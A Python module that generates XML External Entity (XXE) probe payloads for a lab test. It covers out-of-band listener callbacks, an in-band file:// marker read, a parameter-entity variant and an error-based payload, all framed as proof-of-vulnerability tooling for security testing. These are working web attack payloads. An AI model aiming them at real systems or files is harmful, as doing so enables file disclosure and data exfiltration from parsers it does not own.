"""
payloads.py
Builds XML documents used to PROVE (not exploit) an XXE vulnerability.

All payloads point either at:
  - your own listener (out-of-band proof), or
  - a marker file YOU created yourself in the lab (in-band proof).
Never point these at a real system file.
"""


def baseline_payload(root_tag: str = "data", value: str = "hello") -> str:
    """A normal, harmless XML document - used to record the 'normal' response."""
    return f"<?xml version=\"1.0\"?><{root_tag}>{value}</{root_tag}>"


def oob_payload(listener_url: str, root_tag: str = "data") -> str:
    """
    Classic external general entity pointing at our own listener.
    If the parser is vulnerable, it will make an HTTP request to listener_url
    -- that request is our proof.
    """
    return (
        "<?xml version=\"1.0\"?>"
        f"<!DOCTYPE {root_tag} [\n"
        f"  <!ENTITY xxe SYSTEM \"{listener_url}\">\n"
        "]>"
        f"<{root_tag}>&xxe;</{root_tag}>"
    )


def inband_payload(marker_file_uri: str, root_tag: str = "data") -> str:
    """
    External entity pointing at a LOCAL MARKER FILE (file:// URI) that you
    created yourself in the lab, e.g. file:///home/kali/lab/marker.txt
    containing the text 'XXEPROBE_MARKER_12345'.
    If the parser is vulnerable, that marker text comes back in the response.
    """
    return (
        "<?xml version=\"1.0\"?>"
        f"<!DOCTYPE {root_tag} [\n"
        f"  <!ENTITY xxe SYSTEM \"{marker_file_uri}\">\n"
        "]>"
        f"<{root_tag}>&xxe;</{root_tag}>"
    )


def param_entity_payload(listener_url: str, root_tag: str = "data") -> str:
    """
    Parameter-entity variant, for parsers that block plain general external
    entities but still process parameter entities inside the internal DTD
    subset. Also calls home to our listener.
    """
    return (
        "<?xml version=\"1.0\"?>"
        f"<!DOCTYPE {root_tag} [\n"
        f"  <!ENTITY % pxxe SYSTEM \"{listener_url}\">\n"
        "  %pxxe;\n"
        "]>"
        f"<{root_tag}>probe</{root_tag}>"
    )


def error_based_payload(root_tag: str = "data") -> str:
    """
    References an undefined entity on purpose. A parser that is processing
    DOCTYPEs/entities at all will usually raise a distinctive parser error
    that leaks library/version details - that error text is our evidence.
    """
    return (
        "<?xml version=\"1.0\"?>"
        f"<!DOCTYPE {root_tag} [\n"
        "  <!ENTITY xxe \"&undefined_entity_xxeprobe;\">\n"
        "]>"
        f"<{root_tag}>&xxe;</{root_tag}>"
    )
